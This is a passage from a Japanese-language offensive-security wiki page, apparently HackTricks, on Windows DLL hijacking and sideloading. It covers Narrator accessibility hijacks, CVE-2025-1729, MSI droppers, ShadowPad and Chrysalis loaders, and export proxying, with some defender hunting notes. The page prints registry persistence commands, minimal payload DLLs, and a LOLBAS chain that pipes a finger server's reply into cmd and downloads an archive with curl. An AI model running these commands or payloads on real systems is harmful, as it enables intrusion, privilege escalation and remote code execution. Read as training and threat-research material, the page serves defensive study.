    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC silence
- 素朴な hijack は UI 上で発話や強調表示を行います。静かに実行するには、attach 時に Narrator のスレッドを列挙し、メインスレッドを開いて（`OpenThread(THREAD_SUSPEND_RESUME)`）、`SuspendThread` で一時停止します。処理は自身のスレッドで続行します。コード全体は PoC を参照してください。<sup>[[8]](#references)</sup>

Accessibility configuration による起動と永続化
- ユーザーコンテキスト（HKCU）: `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM（HKLM）: `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator の起動時に仕込んだ DLL が読み込まれます。セキュアデスクトップ（ログオン画面）で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL がセキュアデスクトップ上で SYSTEM として実行されます。

RDP による SYSTEM 実行（ラテラルムーブメント）
- 従来の RDP セキュリティレイヤーを有効にする: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL がセキュアデスクトップ上で SYSTEM として実行されます。
- RDP セッションを閉じると実行が停止します。速やかに inject/migrate してください。

Bring Your Own Accessibility（BYOA）
- 組み込みの Accessibility Tool（AT）のレジストリエントリ（例: CursorIndicator）を複製し、任意のバイナリ/DLL を指すよう編集してインポートした後、`configuration` にその AT 名を設定できます。これにより、Accessibility framework 経由で任意の実行をプロキシできます。

注意事項
- `%windir%\System32` への書き込みと HKLM の値の変更には、admin 権限が必要です。
- ペイロードのロジックはすべて `DLL_PROCESS_ATTACH` に記述できます。exports は不要です。

## ケーススタディ: CVE-2025-1729 - TPQMAssistant.exe を使用した権限昇格

このケースでは、Lenovo の TrackPoint Quick Menu（`TPQMAssistant.exe`）における **Phantom DLL Hijacking** を紹介します。CVE-2025-1729 として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### 脆弱性の詳細

- **コンポーネント**: `C:\ProgramData\Lenovo\TPQM\Assistant\` にある `TPQMAssistant.exe`。
- **スケジュールされたタスク**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、ログオン中のユーザーのコンテキストで毎日午前9時30分に実行されます。
- **ディレクトリのアクセス許可**: `CREATOR OWNER` が書き込み可能なため、ローカルユーザーは任意のファイルを配置できます。
- **DLL の検索動作**: 最初に作業ディレクトリから `hostfxr.dll` の読み込みを試み、見つからない場合は "NAME NOT FOUND" を記録します。これは、ローカルディレクトリが優先して検索されることを示しています。

### Exploit の実装

攻撃者は、同じディレクトリに悪意のある `hostfxr.dll` stub を配置し、見つからない DLL を悪用してユーザーのコンテキストでコードを実行できます。

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Attack Flow

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置します。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前9時30分に実行されるのを待ちます。
3. タスクの実行時に管理者がログインしている場合、悪意のある DLL は管理者のセッションで medium integrity で実行されます。
4. 標準的な UAC bypass 技法を連鎖させ、medium integrity から SYSTEM 権限に昇格します。

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

脅威アクターは、信頼された署名済みプロセスの下で payload を実行するため、MSI ベースの dropper と DLL side-loading を頻繁に組み合わせます。<sup>[[10]](#references)</sup>

チェーンの概要
- ユーザーが MSI をダウンロードします。GUI でのインストール中に CustomAction がサイレントに実行され（例: LaunchApplication または VBScript アクション）、埋め込みリソースから次のステージを再構築します。
- dropper は、正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込みます（例: Avast 署名済みの wsc_proxy.exe と、攻撃者が制御する wsc.dll の組み合わせ）。
- 署名済み EXE が起動すると、Windows の DLL 検索順序により、まず作業ディレクトリの wsc.dll が読み込まれ、署名済み親プロセスの下で攻撃者のコードが実行されます（ATT&CK T1574.001）。

MSI 分析（確認するポイント）
- CustomAction テーブル:
  - 実行ファイルまたは VBScript を実行するエントリを探します。疑わしいパターンの例: LaunchApplication がバックグラウンドで埋め込みファイルを実行する。
  - Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary テーブルを確認します。
- MSI CAB 内の埋め込み／分割 payload:
  - 管理者として展開: msiexec /a package.msi /qb TARGETDIR=C:\out
  - または lessmsi を使用: lessmsi x package.msi C:\out
  - VBScript CustomAction によって連結・復号される複数の小さな断片を探します。一般的な流れ:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- 다음 두 파일을 같은 폴더에 둡니다:
  - wsc_proxy.exe: 정식 서명된 host(Avast). 프로세스는 해당 디렉터리에서 이름으로 wsc.dll을 로드하려고 합니다.
  - wsc.dll: 공격자 DLL. 特定のexportsが不要なら、DllMainだけで十分です。それ以外の場合は、proxy DLLを作成し、DllMainでpayloadを実行しながら、必要なexportsを正規のライブラリに転送します。
- 最小限のDLL payloadをビルドします:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- export 要件を満たすには、proxying framework（例: DLLirant/Spartacus）を使って、payload も実行する forwarding DLL を生成します。

- この technique は、host binary による DLL name resolution に依存します。host が absolute path や safe loading flags（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijack に失敗することがあります。
- KnownDLLs、SxS、forwarded exports は優先順位に影響するため、host binary と export set の選定時に考慮する必要があります。

## 署名済み triad + 暗号化 payload（ShadowPad の事例）

Check Point は、Ink Dragon が**3ファイルの triad**を使って ShadowPad を展開し、正規ソフトウェアに紛れ込ませながら、主要な payload をディスク上で暗号化したままにする手法を解説しています:<sup>[[12]](#references)</sup>

1. **署名済み host EXE** – AMD、Realtek、NVIDIA などのベンダーが悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は実行ファイルの名前を Windows binary に見えるよう変更します（例: `conhost.exe`）。ただし、Authenticode signature は有効なままです。
2. **悪意のある loader DLL** – EXE と同じ場所に、想定される名前で配置されます（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。この DLL は通常、ScatterBrain framework で難読化された MFC binary です。その役割は、暗号化 blob を見つけて復号し、ShadowPad を reflectively map することだけです。
3. **暗号化 payload blob** – 多くの場合、同じ directory 内に `<name>.tmp` として保存されます。復号した payload を memory-mapping した後、loader は TMP file を削除し、forensic evidence を消去します。

Tradecraft に関する注意点:

* PE header の元の `OriginalFileName` を維持したまま署名済み EXE の名前を変更すると、ベンダー signature を保持しつつ Windows binary を装えます。そのため、Ink Dragon の手法を再現する場合は、実際には AMD/NVIDIA の utility である `conhost.exe` 風の binary を配置します。
* 実行ファイル自体は trusted なままなので、allowlisting controls の多くは、悪意のある DLL をその隣に置くだけで回避できます。loader DLL のカスタマイズに注力してください。署名済みの parent は通常、そのまま実行できます。
* ShadowPad の decryptor は、TMP blob が loader の隣にあり、mapping 後に file を zero 化できるよう書き込み可能であることを想定しています。payload の読み込みが完了するまで directory を書き込み可能にしておきます。メモリ上に読み込まれた後は、OPSEC のため TMP file を安全に削除できます。

### LOLBAS stager + staged archive sideloading chain（finger → tar/curl → WMI）

Operator は DLL sideloading と LOLBAS を組み合わせ、ディスク上の独自 artifact を trusted EXE の隣に置く悪意のある DLL だけにします:<sup>[[1]](#references)</sup>

- **Remote command loader（Finger）:** Hidden PowerShell が `cmd.exe /c` を起動し、Finger server から command を取得して `cmd` に pipe します:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` は TCP/79 のテキストを取得します。`| cmd` を使うとサーバーの応答を実行できるため、オペレーターはサーバー側で second stage を切り替えられます。

- **組み込みのダウンロード／展開:** 無害な拡張子のアーカイブをダウンロードして展開し、sideload の対象と DLL をランダムな `%LocalAppData%` フォルダーに配置します。

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` は進行状況を非表示にしてリダイレクトを追跡します。`tar -xf` は Windows 標準搭載の tar を使用します。

- **WMI/CIM launch:** WMI 経由で EXE を起動すると、同じ場所にある DLL を読み込む際、テレメトリには CIM によって作成されたプロセスとして記録されます。

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - ローカル DLL を優先するバイナリ（例: `intelbq.exe`、`nearby_share.exe`）で機能し、payload（例: Remcos）は信頼された名前の下で実行される。

- **Hunting:** `/p`、`/m`、`/c` が同時に指定された `forfiles` を検知する。管理者スクリプト以外ではあまり使われない。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近の Lotus Blossom の侵入では、信頼された更新チェーンを悪用し、DLL sideload と完全にメモリ内で動作する payload を仕込む NSIS-packed dropper が配信された。<sup>[[13]](#references)</sup>

Tradecraft の流れ
- `update.exe` (NSIS) は `%AppData%\Bluetooth` を作成して **HIDDEN** に設定し、名前を変更した Bitdefender Submission Wizard `BluetoothService.exe`、悪意のある `log.dll`、暗号化された blob `BluetoothService` を配置してから、EXE を起動する。
- ホスト EXE は `log.dll` を import し、`LogInit`/`LogWrite` を呼び出す。`LogInit` は blob を mmap でロードする。`LogWrite` はカスタムの LCG ベースのストリーム（定数 **0x19660D** / **0x3C6EF35F**、キー素材は事前の hash から導出）で復号し、バッファを平文の shellcode で上書きして、一時データを解放した後、その shellcode にジャンプする。
- IAT を避けるため、loader は **FNV-1a basis 0x811C9DC5 + prime 0x1000193** で export 名を hash し、Murmur 風の avalanche (**0x85EBCA6B**) を適用してから、salt を加えた target hash と比較して API を解決する。

Main shellcode (Chrysalis)
- 5 回の pass でキー `gQ2JR&9;` を使った add/XOR/sub を繰り返し、PE のような main module を復号する。その後、`Kernel32.dll` → `GetProcAddress` を動的にロードして import 解決を完了する。
- 文字ごとの bit-rotate/XOR 変換で DLL 名の文字列を実行時に再構築し、`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` をロードする。
- 2 つ目の resolver は **PEB → InMemoryOrderModuleList** をたどり、各 export table を 4-byte block 単位で解析して Murmur 風の mixing を行う。hash が見つからない場合に限り、`GetProcAddress` にフォールバックする。

Embedded configuration & C2
- 設定は配置された `BluetoothService` ファイル内の **offset 0x30808**（サイズ **0x980**）にあり、キー `qwhvb^435h&*7` で RC4 復号すると、C2 URL と User-Agent が明らかになる。
- Beacon はドット区切りの host profile を構築し、タグ `4Q` を先頭に付けてから、キー `vAuig34%^325hGV` で RC4 暗号化し、HTTPS 経由で `HttpSendRequestA` に渡す。応答は RC4 復号され、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）によって処理される。
- 実行モードは CLI args で制御される。引数なしの場合は `-i` を指す service/Run key persistence をインストールする。`-i` は自身を `-k` 付きで再起動し、`-k` はインストールをスキップして payload を実行する。

Alternate loader の観測例
- 同じ侵入では Tiny C Compiler も配置され、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` が実行されていた。隣には `libtcc.dll` が置かれていた。攻撃者が用意した C ソースには shellcode が埋め込まれており、PE をディスクに書き込むことなく、コンパイルしてメモリ内で実行した。以下のように再現できる:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- この TCC ベースのコンパイル・実行段階では、実行時に `Wininet.dll` をインポートし、ハードコードされた URL から第 2 段階の shellcode を取得していました。これにより、コンパイラーの実行を装う柔軟な loader が実現していました。

## export proxying + host thread parking を使った署名済みホストの sideloading

一部の DLL sideloading チェーンでは、**安定性を高める仕組み**を加えることで、悪意ある DLL の読み込み後にクラッシュすることなく、正規のホストを後続ステージの読み込みに必要な時間だけ稼働させます。<sup>[[11]](#references)</sup>

確認されたパターン
- 信頼された EXE を、`version.dll` など、想定される依存 DLL 名を持つ悪意ある DLL と同じ場所に配置する。
- 悪意ある DLL は、想定されるすべての export を実際のシステム DLL（例: `%SystemRoot%\\System32\\version.dll`）に **proxy** する。これにより、import の解決が成功し、ホストプロセスは動作を続ける。
- 読み込み後、悪意ある DLL はホストのエントリーポイントにパッチを適用し、メインスレッドが終了したりプロセスを終了させるコードパスを実行したりせず、無限の `Sleep` ループに入るようにする。
- 新しいスレッドが実際の悪意ある処理を実行する。次段階 DLL の名前またはパスを復号（RC4/XOR がよく使われる）し、`LoadLibrary` で起動する。

重要な理由
- 通常の DLL proxying は API との互換性を保ちますが、後続ステージに必要な時間だけホストが稼働する保証はありません。
- メインスレッドを `Sleep(INFINITE)` で待機させるのは、worker thread で復号、ステージング、ネットワークの bootstrap を行う間、署名済みプロセスを常駐させる簡単な方法です。
- 不審な `DllMain` だけを探していると、ホストのエントリーポイントにパッチが適用された後、セカンダリスレッドが起動してから興味深い動作が起きるこのパターンを見逃す可能性があります。

最小限の手順
1. 署名済みホスト EXE をコピーし、ローカルディレクトリから読み込む DLL を特定する。
2. 同じ関数を export し、正規の DLL に転送する proxy DLL を作成する。
3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を作成する。
4. そのスレッドからホストのエントリーポイント、またはメインスレッドの開始ルーチンにパッチを適用し、`Sleep` のループに入るようにする。
5. 次段階 DLL の名前や設定を復号し、`LoadLibrary` を呼び出すか、payload を manual-map する。

防御側の調査ポイント
- `version.dll` などの一般的なライブラリを、`System32` ではなくアプリケーションディレクトリから読み込む署名済みプロセス。
- イメージの読み込み直後にプロセスのエントリーポイントへ適用されるメモリパッチ。特に `Sleep`/`SleepEx` へのジャンプや呼び出し。
- proxy DLL が作成したスレッドが、復号した名前を持つ 2 つ目の DLL に対してすぐ `LoadLibrary` を呼び出す動作。
- `ProgramData`、`%TEMP%`、展開済みアーカイブのパスなど、書き込み可能なステージングディレクトリ内で、ベンダーの実行ファイルと同じ場所に置かれた全 export 対応の proxy DLL。

## References

- [1] [Red Canary – Intelligence Insights: 2026年1月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe を使った権限昇格](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows での DLL hijacking。シンプルな C の例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore がヨーロッパを標的とする新たな malware を展開](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – デジタルのそっくりさん: Gh0st RAT を配布する進化するなりすましキャンペーンの分析](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – 利害の収束: 東南アジア政府を標的とする脅威クラスターの分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon の内側: ステルス性の高い攻撃作戦における relay network と内部動作の解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom の toolkit を詳しく解説](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack チェーン](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – イランの APT Screening Serpens による 2026 年の諜報キャンペーンを追跡](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – 矢継ぎ早の攻撃: イラン紛争中の Nimbus Manticore の作戦](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062、東南アジアの政府機関と重要インフラを標的に](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
